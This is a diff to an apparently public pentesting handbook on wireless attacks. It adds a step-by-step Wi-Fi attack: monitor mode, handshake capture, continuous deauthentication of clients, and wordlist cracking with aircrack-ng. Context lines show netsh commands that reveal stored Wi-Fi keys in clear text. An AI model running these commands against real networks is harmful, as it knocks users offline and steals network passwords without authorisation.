@@ -11,6 +11,7 @@
 - [Apple Wi-Fi Evil SSID](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#Apple-Wi-Fi-Evil-SSID)
 - [mdk3](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#mdk3)
 - [Microsoft Windows](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#Microsoft-Windows)
+- [Wi-Fi Example Attack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/06_wireless_attacks.md#Wi-Fi-Example-Attack)
 
 ## Resources
 
@@ -90,4 +91,25 @@ PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
 
 ```c
 PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
+```
+
+## Wi-Fi Example Attack
+
+```c
+$ sudo airmon-ng check kill
+$ sudo airmon-ng start wlan0
+$ sudo airodump-ng wlan0mon
+$ sudo airodump-ng -w <FILE> -c <CHANNEL> --bssid <BSSID> wlan0mon
+```
+
+```c
+$ sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
+```
+
+```c
+$ aircrack-ng <FILE>.cap -w /usr/share/wordlists/rockyou.txt
+```
+
+```c
+$ sudo airmon-ng stop wlan0mon
 ```
